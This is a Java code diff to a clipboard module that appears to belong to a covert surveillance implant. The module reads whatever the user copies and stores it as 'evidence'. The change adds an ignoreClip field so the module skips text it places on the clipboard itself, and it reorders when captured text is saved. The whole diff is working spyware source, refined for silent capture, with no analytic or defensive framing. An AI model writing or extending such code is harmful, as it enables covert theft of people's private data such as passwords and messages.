@@ -36,6 +36,8 @@ public final class ModuleClipboard extends BaseModule implements UserAgent {
 
     private boolean clipSuspended;
 
+    private String ignoreClip;
+
     public static String getStaticType() {
         return Messages.getString("17.0"); //$NON-NLS-1$
     }
@@ -64,14 +66,15 @@ public final class ModuleClipboard extends BaseModule implements UserAgent {
         if (clipSuspended) {
             return;
         }
+        
         String clip = (String) Clipboard.getClipboard().get();
         if (clip != null) {
-            if (!clip.equals(lastClip)) {
+            if (!clip.equals(lastClip) && !clip.equals(ignoreClip)) {
                 //#ifdef DEBUG
                 debug.trace("actualRun: captured " + clip); //$NON-NLS-1$
                 //#endif
-                saveEvidence(clip);
                 lastClip = clip;
+                saveEvidence(clip);                
             }
         }
     }
@@ -87,7 +90,7 @@ public final class ModuleClipboard extends BaseModule implements UserAgent {
         debug.trace("setClip: " + clip.length()); //$NON-NLS-1$
         //#endif
 
-        lastClip = clip;
+        ignoreClip = clip;
 
         try {
             Clipboard.getClipboard().put(null);
